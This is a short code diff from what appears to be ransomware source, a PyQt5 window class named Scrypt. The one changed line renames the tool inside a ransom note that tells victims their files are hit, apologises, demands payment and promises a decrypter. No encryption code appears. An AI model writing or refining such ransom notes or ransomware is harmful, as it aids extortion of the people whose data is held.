@@ -204,7 +204,7 @@ class Scrypt(PyQt5.QtWidgets.QMainWindow):
 detailedNote = f"""
 -------------------------------------------------------------------------------------------------------------------------
 Hello,\n
-    If you are reading this then you have likely been hit by my Ransomware\n
+    If you are reading this then you have likely been hit by Scrypt Ransomware\n
     We apologize for the incovience, at the end of the day we just want to get paid\n
     In order to receive the decrypter you must follow the following steps to truely recover\n
     all your files.\n
